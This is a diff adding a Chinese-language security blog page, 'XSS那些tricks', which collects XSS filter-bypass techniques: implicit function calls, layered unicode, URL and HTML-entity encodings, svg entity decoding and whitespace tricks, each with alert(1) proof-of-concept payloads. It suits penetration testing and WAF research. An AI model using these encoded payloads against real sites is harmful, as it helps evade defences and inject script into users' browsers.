@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang=&#34;en&#34;>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#070807">
+  <title>XSS那些tricks · Deen&#39;s blog</title>
+  <link rel="icon" href="/images/favicon.ico">
+  <link rel="stylesheet" href="/css/style.css?v=1.1.2"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><main class="site-shell">
+    <header class="site-header">
+  <nav class="site-nav" aria-label="Primary navigation">
+    
+      <a href="/">Home</a>
+    
+      <a href="/archives/">Archives</a>
+    
+      <a href="/about/">About</a>
+    
+  </nav>
+</header>
+<div class="header-rule" aria-hidden="true"></div>
+
+    <article class="post-detail" itemscope itemtype="https://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 itemprop="headline">XSS那些tricks</h1>
+    <p class="post-meta">
+      <time datetime="2020-03-30T13:46:22.000Z" itemprop="datePublished">2020-03-30</time>
+      
+    </p>
+  </header>
+  <div class="article-content" itemprop="articleBody"><h2 id="0x00-XSS的WAF防护"><a href="#0x00-XSS的WAF防护" class="headerlink" title="0x00 XSS的WAF防护"></a>0x00 XSS的WAF防护</h2><p>最近碰到的两种方式</p>
+<ol>
+<li>字符串匹配，匹配恶意关键字，比较常见。一般手段为正则匹配，绕过可以通过编码，或者注释符，或者浏览器渲染特性进行绕过。</li>
+<li>解析js语法。通过截取指定标签内容，对js进行静态语法树解析，对解析出来的语法树进行遍历，在语法树的各个节点进行hook，在节点进行判断。如函数调用的call expression,若call的字符串为alert，则封禁。</li>
+</ol>
+<h2 id="0x01-javascript的隐性调用"><a href="#0x01-javascript的隐性调用" class="headerlink" title="0x01 javascript的隐性调用"></a>0x01 javascript的隐性调用</h2><p>在调用某些对象，或者执行某些方法时，会自动隐式的调用某些函数。这里有个缺憾，自动调用的函数是不带参数的，并没有找到可以利用的方法（在空白页面），不同环境下有其他利用方法？</p>
+<h3 id="一、toString和valueOf"><a href="#一、toString和valueOf" class="headerlink" title="一、toString和valueOf"></a>一、toString和valueOf</h3><p>obj进行值运算时，如==,+,-等，会自动调用toString,或者valueOf方法。</p>
+<p>payload: </p>
+<ul>
+<li><code>toString=alert;this-1</code></li>
+<li><code>valueOf=alert;this-1</code></li>
+</ul>
+<h3 id="二、JSON对象的toJSON"><a href="#二、JSON对象的toJSON" class="headerlink" title="二、JSON对象的toJSON"></a>二、JSON对象的toJSON</h3><p>如果JSON的stringify方法传入的对象有toJSON方法,那么该方法执行的对象会转为toJSON执行后返回的对象。</p>
+<p>payload: <code>toJSON=alert;JSON.stringify(this);</code></p>
+<h3 id="三、promise对象的-then"><a href="#三、promise对象的-then" class="headerlink" title="三、promise对象的 then"></a>三、promise对象的 then</h3><blockquote>
+<p>当Promise.resolve方法传入对象时,如果存在 then 方法会立即执行then方法,相当于把方法放入new Promise中,除了Promise.resolve有这个行为外,Promise.all也有这个行为。</p>
+</blockquote>
+<p>payload：</p>
+<ul>
+<li><code>then=alert;Promise.resolve(this).then()</code></li>
+<li><code>then=alert;Promise.all([this]).then()</code></li>
+</ul>
+<h3 id="四、thow和onerror"><a href="#四、thow和onerror" class="headerlink" title="四、thow和onerror"></a>四、thow和onerror</h3><p>payload: <code>&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;</code></p>
+<h2 id="0x02-编码"><a href="#0x02-编码" class="headerlink" title="0x02 编码"></a>0x02 编码</h2><p>先知道哪些标签会进行解码，还有组合在一起时的解码顺序，才会知道在绕过时如何进行编码。</p>
+<ul>
+<li><p>unicode 编码，形如\u003c。js标签会自动解码。</p>
+<ul>
+<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> =&gt; <code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</code> (括号及括号内的不可进行unicode16进制编码)</li>
+<li><code>&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(&#39;xss&#39;)&quot;&gt;test&lt;/a&gt;</code></li>
+</ul>
+</li>
+<li><p>url解码</p>
+<ul>
+<li><code>&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;a&lt;/a&gt;</code> 先unicode编码再urlencode编码。</li>
+<li><code>&lt;a href=&quot;javascript:%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074%283%29&quot;&gt;a&lt;/a&gt;</code></li>
+</ul>
+</li>
+<li><p>html实体编码</p>
+<ul>
+<li><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;&quot;&gt;test&lt;/a&gt;</code></li>
+<li><code>&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;a&lt;/a&gt;</code>  进行编码=&gt; <code>&lt;a href=&quot;&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0025;&amp;#x0035;&amp;#x0043;&amp;#x0075;&amp;#x0030;&amp;#x0030;&amp;#x0036;&amp;#x0031;&amp;#x0025;&amp;#x0035;&amp;#x0043;&amp;#x0075;&amp;#x0030;&amp;#x0030;&amp;#x0036;&amp;#x0063;&amp;#x0025;&amp;#x0035;&amp;#x0043;&amp;#x0075;&amp;#x0030;&amp;#x0030;&amp;#x0036;&amp;#x0035;&amp;#x0025;&amp;#x0035;&amp;#x0043;&amp;#x0075;&amp;#x0030;&amp;#x0030;&amp;#x0037;&amp;#x0032;&amp;#x0025;&amp;#x0035;&amp;#x0043;&amp;#x0075;&amp;#x0030;&amp;#x0030;&amp;#x0037;&amp;#x0034;&amp;#x0025;&amp;#x0032;&amp;#x0038;&amp;#x0033;&amp;#x0025;&amp;#x0032;&amp;#x0039;&quot;&gt;a&lt;/a&gt;</code></li>
+</ul>
+</li>
+<li><p>混合编码</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 原代码</span><br><span class="line">   &lt;</span><br><span class="line">   &lt;a href=<span class="string">"javascript:alert('xss')"</span>&gt;test&lt;/a&gt;</span><br><span class="line">   <span class="number">2.</span> 对alert进行JS编码（unicode编码）</span><br><span class="line">   &lt;a href=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074('xss')"</span>&gt;test&lt;/a&gt;</span><br><span class="line">   <span class="number">3.</span> 对href标签中的<span class="string">\u0061\u006c\u0065\u0072\u0074进行URL编码</span></span><br><span class="line">   &lt;a href=<span class="string">"javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34('xss')"</span>&gt;test&lt;/a&gt;</span><br><span class="line">   <span class="number">4.</span> 对href标签中的javascript:%<span class="number">5c</span>%<span class="number">75</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">5c</span>%<span class="number">75</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">5c</span>%<span class="number">75</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">5c</span>%<span class="number">75</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">5c</span>%<span class="number">75</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">37</span>%<span class="number">34</span>(<span class="string">'xss'</span>)进行HTML编码：</span><br><span class="line">   &lt;a href=<span class="string">"&amp;<span class="subst">#x6a</span>;&amp;<span class="subst">#x61</span>;&amp;<span class="subst">#x76</span>;&amp;<span class="subst">#x61</span>;&amp;<span class="subst">#x73</span>;&amp;<span class="subst">#x63</span>;&amp;<span class="subst">#x72</span>;&amp;<span class="subst">#x69</span>;&amp;<span class="subst">#x70</span>;&amp;<span class="subst">#x74</span>;&amp;<span class="subst">#x3a</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x63</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x37</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x36</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x31</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x63</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x37</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x36</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x36</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x63</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x37</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x36</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x63</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x37</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x37</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x32</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x63</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x37</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x37</span>;&amp;<span class="subst">#x25</span>;&amp;<span class="subst">#x33</span>;&amp;<span class="subst">#x34</span>;&amp;<span class="subst">#x28</span>;&amp;<span class="subst">#x27</span>;&amp;<span class="subst">#x78</span>;&amp;<span class="subst">#x73</span>;&amp;<span class="subst">#x73</span>;&amp;<span class="subst">#x27</span>;&amp;<span class="subst">#x29</span>;"</span>&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 对javascript:alert(<span class="number">1</span>)进行HTML编码</span><br><span class="line">&lt;img src=xxx onerror=<span class="string">"&amp;<span class="subst">#x6a</span>;&amp;<span class="subst">#x61</span>;&amp;<span class="subst">#x76</span>;&amp;<span class="subst">#x61</span>;&amp;<span class="subst">#x73</span>;&amp;<span class="subst">#x63</span>;&amp;<span class="subst">#x72</span>;&amp;<span class="subst">#x69</span>;&amp;<span class="subst">#x70</span>;&amp;<span class="subst">#x74</span>;&amp;<span class="subst">#x3a</span>;&amp;<span class="subst">#x61</span>;&amp;<span class="subst">#x6c</span>;&amp;<span class="subst">#x65</span>;&amp;<span class="subst">#x72</span>;&amp;<span class="subst">#x74</span>;&amp;<span class="subst">#x28</span>;&amp;<span class="subst">#x31</span>;&amp;<span class="subst">#x29</span>;"</span>&gt;</span><br><span class="line"><span class="number">2.</span> 对alert进行JS编码</span><br><span class="line">&lt;img src=xxx onerror=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(1)"</span>&gt;</span><br><span class="line"><span class="number">3.</span> 以上两种方法混用</span><br><span class="line">&lt;img src=xxx onerror=<span class="string">"&amp;<span class="subst">#x6a</span>;&amp;<span class="subst">#x61</span>;&amp;<span class="subst">#x76</span>;&amp;<span class="subst">#x61</span>;&amp;<span class="subst">#x73</span>;&amp;<span class="subst">#x63</span>;&amp;<span class="subst">#x72</span>;&amp;<span class="subst">#x69</span>;&amp;<span class="subst">#x70</span>;&amp;<span class="subst">#x74</span>;&amp;<span class="subst">#x3a</span>;&amp;<span class="subst">#x5c</span>;&amp;<span class="subst">#x75</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x36</span>;&amp;<span class="subst">#x31</span>;&amp;<span class="subst">#x5c</span>;&amp;<span class="subst">#x75</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x36</span>;&amp;<span class="subst">#x63</span>;&amp;<span class="subst">#x5c</span>;&amp;<span class="subst">#x75</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x36</span>;&amp;<span class="subst">#x35</span>;&amp;<span class="subst">#x5c</span>;&amp;<span class="subst">#x75</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x37</span>;&amp;<span class="subst">#x32</span>;&amp;<span class="subst">#x5c</span>;&amp;<span class="subst">#x75</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x30</span>;&amp;<span class="subst">#x37</span>;&amp;<span class="subst">#x34</span>;&amp;<span class="subst">#x28</span>;&amp;<span class="subst">#x31</span>;&amp;<span class="subst">#x29</span>;"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>svg的xml属性</li>
+</ul>
+<p>payload: <code>&lt;svg&gt;&lt;script&gt;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;&lt;/script&gt;</code> </p>
+<p>svg标签后接的scrpt标签，会自动进行一次实体解析。</p>
+<p>其实可以混合编码利用：先unicode16进制编码，再实体编码。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> alert<span class="comment">(1)</span></span><br><span class="line"><span class="number">2.</span> \u<span class="number">0061</span>\u<span class="number">006</span>c\u<span class="number">0065</span>\u<span class="number">0072</span>\u<span class="number">0074</span><span class="comment">(1)</span></span><br><span class="line"><span class="number">3.</span> &amp;<span class="attr">#x005</span>c;&amp;<span class="attr">#x0075</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0036</span>;&amp;<span class="attr">#x0031</span>;&amp;<span class="attr">#x005</span>c;&amp;<span class="attr">#x0075</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0036</span>;&amp;<span class="attr">#x0063</span>;&amp;<span class="attr">#x005</span>c;&amp;<span class="attr">#x0075</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0036</span>;&amp;<span class="attr">#x0035</span>;&amp;<span class="attr">#x005</span>c;&amp;<span class="attr">#x0075</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0037</span>;&amp;<span class="attr">#x0032</span>;&amp;<span class="attr">#x005</span>c;&amp;<span class="attr">#x0075</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0037</span>;&amp;<span class="attr">#x0034</span>;&amp;<span class="attr">#x0028</span>;&amp;<span class="attr">#x0031</span>;&amp;<span class="attr">#x0029</span>;</span><br><span class="line"><span class="number">4.</span> &lt;svg&gt;&lt;script&gt;&amp;<span class="attr">#x005</span>c;&amp;<span class="attr">#x0075</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0036</span>;&amp;<span class="attr">#x0031</span>;&amp;<span class="attr">#x005</span>c;&amp;<span class="attr">#x0075</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0036</span>;&amp;<span class="attr">#x0063</span>;&amp;<span class="attr">#x005</span>c;&amp;<span class="attr">#x0075</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0036</span>;&amp;<span class="attr">#x0035</span>;&amp;<span class="attr">#x005</span>c;&amp;<span class="attr">#x0075</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0037</span>;&amp;<span class="attr">#x0032</span>;&amp;<span class="attr">#x005</span>c;&amp;<span class="attr">#x0075</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0030</span>;&amp;<span class="attr">#x0037</span>;&amp;<span class="attr">#x0034</span>;&amp;<span class="attr">#x0028</span>;&amp;<span class="attr">#x0031</span>;&amp;<span class="attr">#x0029</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-空白字符"><a href="#0x03-空白字符" class="headerlink" title="0x03 空白字符"></a>0x03 空白字符</h2><p>payload从浏览器地址栏到页面上有一次url解码，可以理解为经过了一次unscape函数。</p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">alert=<span class="function"><span class="keyword">function</span><span class="params">(i)</span>&#123;</span></span><br><span class="line">console.<span class="built_in">log</span>(<span class="built_in">i</span>.toString(<span class="number">16</span>))</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">i</span>=<span class="number">0</span>;<span class="built_in">i</span>&lt;<span class="number">257</span>;<span class="built_in">i</span>++)&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;eval(<span class="string">'alert'</span>+String.fromCharCode(<span class="built_in">i</span>)+<span class="string">'('</span>+<span class="built_in">i</span>+<span class="string">')'</span>)&#125;<span class="keyword">catch</span>(e)&#123;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">结果：<span class="number">09</span> <span class="number">0</span>a <span class="number">0</span>b <span class="number">0</span>c  <span class="number">0</span>d  <span class="number">20</span></span><br></pre></td></tr></table></figure>
+
+<p>payload:<code>&lt;script&gt;%0b%0balert%0b%a%0c(1)&lt;/script&gt;</code></p>
+<p>利用条件为从地址栏到页面输出。可以用来绕过waf。</p>
+<h2 id="0x04-一些奇奇怪怪的payload"><a href="#0x04-一些奇奇怪怪的payload" class="headerlink" title="0x04 一些奇奇怪怪的payload"></a>0x04 一些奇奇怪怪的payload</h2><blockquote>
+<p>Lol:Function`alert(1)```````````</p>
+</blockquote>
+<blockquote>
+<p>!class extends`${alert(1)}```{}</p>
+</blockquote>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul>
+<li><a href="https://segmentfault.com/a/1190000013246536">javascript中你可能遇到的隐式调用</a></li>
+<li><a href="https://saucer-man.com/information_security/103.html">探索XSS利用编码绕过的原理</a></li>
+</ul>
+</div>
+</article>
+
+    <footer class="site-footer">
+  Copyright © 2026 Deen&#39;s blog
+</footer>
+
+  </main>
+  <script>
+    (function () {
+      var terminal = document.querySelector('[data-terminal-intro]');
+      var reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+      if (!terminal || reduceMotion) return;
+
+      var introSeen = false;
+      try { introSeen = window.sessionStorage.getItem('deen-terminal-intro-seen') === '1'; } catch (error) {}
+      if (introSeen) return;
+      try { window.sessionStorage.setItem('deen-terminal-intro-seen', '1'); } catch (error) {}
+
+      var root = document.documentElement;
+      var lines = terminal.querySelectorAll('.terminal-command .terminal-typed');
+      var output = terminal.querySelector('.terminal-output');
+      var cursors = terminal.querySelectorAll('.terminal-cursor');
+      var list = document.querySelector('.post-list');
+      var pagination = document.querySelector('.terminal-status');
+      var text = Array.prototype.map.call(lines, function (line) { return line.textContent; });
+      var delay = function (milliseconds) { return new Promise(function (resolve) { window.setTimeout(resolve, milliseconds); }); };
+      var type = function (line, value) {
+        line.textContent = '';
+        return new Promise(function (resolve) {
+          var index = 0;
+          var tick = function () {
+            line.textContent += value.charAt(index++);
+            if (index < value.length) window.setTimeout(tick, 28);
+            else resolve();
+          };
+          tick();
+        });
+      };
+
+      root.classList.add('terminal-booting');
+      cursors[0].classList.add('is-active');
+      output.classList.remove('is-visible');
+      type(lines[0], text[0])
+        .then(function () {
+          cursors[0].classList.remove('is-active');
+          output.classList.add('is-visible');
+          return delay(260);
+        })
+        .then(function () { cursors[1].classList.add('is-active'); })
+        .then(function () { return type(lines[1], text[1]); })
+        .then(function () {
+          cursors[1].classList.remove('is-active');
+          Array.prototype.forEach.call(list.children, function (item, index) {
+            item.style.transitionDelay = (index * 42) + 'ms';
+            item.classList.add('is-visible');
+          });
+          if (pagination) pagination.classList.add('is-visible');
+          root.classList.remove('terminal-booting');
+        });
+    }());
+
+    document.querySelectorAll('.article-content .highlight').forEach(function (block) {
+      var code = block.querySelector('code, td.code, pre');
+      if (!code) return;
+      var className = block.className.split(/\s+/).find(function (name) { return name !== 'highlight'; });
+      var toolbar = document.createElement('div');
+      toolbar.className = 'code-toolbar';
+      toolbar.innerHTML = '<span class="code-controls" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-language"></span><button type="button" data-copy-code>Copy</button>';
+      toolbar.querySelector('.code-language').textContent = className || 'text';
+      block.prepend(toolbar);
+      var table = block.querySelector('table');
+      if (table) {
+        var scroller = document.createElement('div');
+        scroller.className = 'code-scroll';
+        table.parentNode.insertBefore(scroller, table);
+        scroller.appendChild(table);
+      }
+    });
+    document.addEventListener('click', function (event) {
+      var button = event.target.closest('[data-copy-code]');
+      if (!button) return;
+      var code = button.closest('.highlight, .code-block').querySelector('code, td.code, pre');
+      if (!code || !navigator.clipboard) return;
+      navigator.clipboard.writeText(code.innerText).then(function () {
+        button.textContent = 'Copied';
+        window.setTimeout(function () { button.textContent = 'Copy'; }, 1400);
+      });
+    });
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
